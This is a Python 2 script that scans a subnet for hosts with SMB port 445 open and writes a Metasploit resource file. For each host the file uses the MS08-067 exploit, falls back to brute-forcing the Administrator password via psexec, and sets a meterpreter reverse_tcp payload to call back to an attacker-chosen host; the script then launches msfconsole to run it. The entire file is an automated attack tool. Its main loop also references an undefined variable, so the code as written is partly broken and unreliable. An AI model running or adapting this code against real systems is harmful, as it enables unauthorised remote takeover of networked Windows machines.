import os
import optparse
import sys
import nmap

#user provides subnet to be scanned. Function determines what hosts in the subnet have port 445 open. Returns array of hosts
def findTgts(subNet):
	nmScan = nmap.PortScanner() #define port scanner
	nmScan.scan(subNet, '445') #scan provided subnet for hosts on port 445
	tgtHosts =[]
	for host in nmScan.all_hosts(): #iterate for all hosts found in the scan to determine if 445 is open
		if nmScan[host].has_tcp(445):
			state = nmScan[host]['tcp'][445]['state']
			if state == 'open':
				print '[+] Found target host: ' + host
				tgtHosts.append(host)
	return tgtHosts

#writes to metasploit resource config file (configFile) using the user provided local host and local port
def setupHandler(configFile, lhost,lport):
	configFile.write('use exploit/multi/handler\n')
	configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
	configFile.write('set LPORT ' +str(lport) + '\n')
	configFile.write('set LHOST ' +lhost+'\n')
	configFile.write('exploit -j -z\n')
	configFile.write('setg DisablePayloadHandler 1\n')

#writes to the configFile what exploit to use in the attack
def confickerExploit(configFile, tgtHost, lhost, lport):
	configFile.write('use exploit/windows/smb/ms08067_netapi\n') #exploit to use
	configFile.write('set RHOST ' +str(tgtHost) + '\n') #sets the target of the attack
	configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
	configFile.write('set LPORT ' +str(lport) + '\n')
	configFile.write('set LHOST ' +lhost+'\n')
	configFile.write('exploit -j -z\n')

#if the first attack vector fails, this function attempts to brute force the Administrator password to gain access to the host
def smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
	username = 'Administrator' #using the default windows administrator username
	pF = open(passwdFile, 'r') #open the password file
	for password in pF.readlines(): #go through every password in the password file
		password = password.strip('\n').strip('\r')
		configFile.write('use exploit/windows/smb/psexec\n') #use the psexec exploit
		configFile.write('set SMBUser ' +str(username)+ '\n')
		configFile.write('set SMBPass ' +str(password)+ '\n')
		configFile.write('set RHOST ' +str(tgtHost)+ '\n')
		configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
		configFile.write('set LPORT ' +str(lport) + '\n')
		configFile.write('set LHOST ' +lhost+'\n')
		configFile.write('exploit -j -z\n')
	pF.close()

def main():
	configFile = open('meta.rc', 'w')
	parser = optparse.OptionParser('[-] Usage%prog -H <RHOST[s]> -l <LHOST> [-p <LPORT -F <PASSWORD FILE>]')
	parser.add_option('-H', dest='tgtHost', type='string', help = 'specify the target address[es]')
	parser.add_option('-p', dest='lport', type='string', help = 'specify the listen port')
	parser.add_option('-l', dest='lhost', type='string', help = 'specify the listen address')
	parser.add_option('-F', dest='passwdFile', type='string', help = 'specify the password file')
	(options, args) = parser.parse_args()

	if (options.tgtHost == None) | (options.lhost == None): #check if the target or listen hosts were left blank
		print parser.usage
		exit(0)

	lhost = options.lhost
	lport = options.lport
	if lport == None:
		lport = '1337' #assign listen port value if the user did not themselves

	passwdFile = options.passwdFile
	tgtHosts = findTgts(options.tgtHost) #use findTgts function to determine what hosts will be targeted in the attack
	setupHandler(configFile, lhost, lport) #write the multi/handler to the metasploit config file
	for tgtHost in tgtHosts: #iterate through all of the hosts
		confickerExploit(configFile, tgtHost, lhost, lport)
		if passwordFile != None: #if a password file is provided, write bruteforce steps to config file
			smbBrute(configFile, tgtHost, passwdFile, lhost, lport)

	configFile.close()
	os.system('msfconsole -r meta.rc') #execute the config file

if __name__ == '__main__':
	main()

